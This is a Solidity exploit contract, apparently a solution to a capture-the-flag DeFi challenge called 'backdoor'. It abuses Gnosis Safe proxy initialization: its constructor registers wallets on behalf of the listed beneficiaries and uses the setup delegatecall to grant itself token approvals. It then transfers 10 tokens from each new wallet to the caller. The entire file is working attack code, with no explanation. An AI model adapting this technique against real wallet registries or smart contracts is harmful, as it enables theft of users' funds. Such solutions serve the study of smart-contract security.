// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../../../src/Contracts/backdoor/WalletRegistry.sol";

contract Exploit {
    ApproveOnDelegateCall approveOnDelegateCall;
    WalletRegistry registry;
    GnosisSafeProxyFactory factory;
    GnosisSafeProxy proxySafe;

    constructor(address _registry, address[] memory _beneficiaries) {
        registry = WalletRegistry(_registry);
        factory = GnosisSafeProxyFactory(registry.walletFactory());

        approveOnDelegateCall = new ApproveOnDelegateCall();
        IERC20 token = registry.token();

        // function to call on proxy initialization
        bytes memory moduleData = abi.encodeWithSignature(
            "onDelegateCall(address,address,uint256)",
            address(token),
            address(this),
            10 ether
        );

        // For each wallet there must be only 1 owner
        for (uint256 i; i < _beneficiaries.length; ++i) {
            address[] memory proxyOwners = new address[](1);
            proxyOwners[0] = _beneficiaries[i];

            // data for initialization
            bytes memory proxyData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                proxyOwners, // proxy owner
                1, // threshold
                address(approveOnDelegateCall), // address for token approvals (GnosisSafe:setupModules)
                moduleData,
                0,
                0,
                0,
                0
            );

            proxySafe = factory.createProxyWithCallback(
                registry.masterCopy(),
                proxyData,
                1,
                IProxyCreationCallback(registry)
            );

            token.transferFrom(address(proxySafe), msg.sender, 10 ether);
        }
    }
}

contract ApproveOnDelegateCall {
    function onDelegateCall(
        address token,
        address spender,
        uint256 amount
    ) public {
        IERC20(token).approve(spender, amount);
    }
}
